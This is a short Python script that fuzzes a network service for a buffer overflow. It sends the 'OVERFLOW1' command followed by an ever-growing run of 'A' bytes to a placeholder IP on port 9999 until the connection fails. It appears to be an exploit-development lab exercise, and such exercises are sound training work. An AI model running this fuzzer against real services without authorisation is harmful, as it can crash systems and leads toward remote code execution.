import socket
import time

target_ip = 'IP'
target_port = 9999

A = 200

# Establish the connection once
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))

    while True:
        try:
            # Create payload and send
            payload = b"OVERFLOW1 " + b"A" * A
            s.send(payload)
            print(f"Sent {A} bytes")
            
            # Increase payload size
            A += 200
            time.sleep(1)

        except Exception as e:
            print(f"Sending failed: {e}")
            break

finally:
    s.close()
